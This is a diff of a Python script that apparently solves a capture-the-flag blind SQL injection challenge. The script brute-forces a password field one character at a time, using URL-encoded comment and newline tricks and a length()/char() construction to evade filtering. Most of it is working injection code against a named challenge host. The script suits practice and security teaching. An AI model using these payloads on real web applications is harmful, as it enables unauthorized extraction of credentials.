@@ -8,8 +8,8 @@ flag = ''
 # Make the request
 for cnt in range(1,100):
     cnt_use = False
-    for i in key_full:
-        payload = f"Binary%23%0asubstr(userpw,length('{'_'*cnt}'),length('_'))='{i}'"
+    for i in range(32,127):
+        payload = f"Binary%23%0asubstr(userpw,length('{'_'*cnt}'),length('_'))=char(length('{'_'*i}'))"
         url = (
             "http://2024fsec.arang.kr:9200/sqli3.php?"
             "userid=userid=a%27=%27a%27%23%0a"
@@ -17,11 +17,13 @@ for cnt in range(1,100):
             f"and%23%0a{payload}%23&userpw=guest"
         )
         response = requests.get(url)
+
+#        print(response.status_code)
+#        print(response.content.decode())
+#        break
         if is_ok(response.text[:11]):
-            flag+=i
+            flag+=chr(i)
             print(flag)
             cnt_use = True
             break
     print(cnt,cnt_use)
-
-#근데 이렇게 풀면 몇몇 특수문자가 무시된다. 특히 + 나 숫자는 URL의 고유한 값이라서 따로 처리가 되지 않는다.
